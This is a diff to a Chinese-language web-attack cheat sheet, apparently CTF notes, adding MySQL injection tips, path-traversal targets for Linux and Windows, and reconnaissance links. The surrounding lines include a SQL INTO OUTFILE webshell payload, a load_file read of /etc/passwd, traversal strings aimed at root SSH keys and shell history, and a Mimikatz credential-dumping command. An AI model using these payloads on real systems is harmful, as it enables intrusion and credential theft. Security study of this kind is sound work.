@@ -288,6 +288,12 @@ cat $(ls)
     - 寫webshell
         - 需知道可寫路徑
         - `UNION SELECT "<? system($_GET[1]);?>",2,3 INTO OUTFILE "/var/www/html/temp/shell.php"`
+    - 權限
+        - `SELECT file_priv FROM mysql.user`
+    - secure-file-priv
+        - 限制MySQL導入導出
+        - e.g. `secure_file_priv=E:\`
+            - 限制導入導出只能在E:\下
 - IF語句
     - IF(condition,true-part,false-part)
     - `SELECT IF (1=1,'true','false')`
@@ -298,7 +304,7 @@ cat $(ls)
     - `SELECT load_file(0x2F6574632F706173737764);`
         - /etc/passwd
     - 可繞過一些WAF
-        - e.g. 不能使用單引號時，`'` => `\'`
+        - e.g. 用在不能使用單引號時，`'` => `\'`
 - 註解：
     - `#`
     - `--`
@@ -327,6 +333,8 @@ cat $(ls)
     - database()
         - schema()
         - current database
+    - @@basedir
+        - MySQL安裝路徑
     - @@datadir
         - Location of db file
     - @@hostname
@@ -460,6 +468,11 @@ cat $(ls)
 - Error Based
     - 利用型別轉換錯誤
     - `id=1 and user=0`
+
+- 判斷是否站庫分離
+    - 客戶端主機名：`select host_name();`
+    - 服務端主機名：`select @@servername; `
+    - 兩者不同即站庫分離
 
 ## Oracle
 
@@ -654,15 +667,18 @@ HQL injection example (pwn2win 2017)
 
 ## Testing Payload
 
+### Linux / Unix
+
 - `../../../../../../etc/passwd`
 - `../../../../../../etc/passwd%00`
     - 僅在5.3.0以下可用
     - magic_quotes_gpc需為OFF
-- `../../../../../../../../../boot.ini/.......................`
 - `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
 - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
 - `/var/log/apache2/error.log`
+- `/var/log/httpd/access_log`
 - `/usr/local/apache2/conf/httpd.conf`
+- `/usr/local/etc/apache2/httpd.conf`
 - `/etc/nginx/conf.d/default.conf`
 - `/etc/nginx/nginx.conf`
 - `/etc/nginx/sites-enabled/default.conf`
@@ -670,6 +686,14 @@ HQL injection example (pwn2win 2017)
 - `/root/.bash_history`
 - `/root/.ssh/id_rsa`
 - `/root/.ssh/authorized_keys`
+
+### Windows
+
+- `C:/Windows/win.ini`
+- `C:/boot.ini`
+- `C:/apache/logs/access.log`
+- `../../../../../../../../../boot.ini/.......................`
+- `C:/windows/system32/drivers/etc/hosts`
 
 ## 環境變數
 
@@ -1179,7 +1203,11 @@ xxe.dtd:
 
 - https://www.zoomeye.org/
 
+- https://censys.io
+
 - https://crt.sh/
+
+- https://dnsdumpster.com/
 
 - https://www.domainiq.com/reverse_whois
 
@@ -1234,6 +1262,8 @@ xxe.dtd:
 - https://github.com/PowerShellMafia/PowerSploit
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/
+
+- http://xssor.io
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
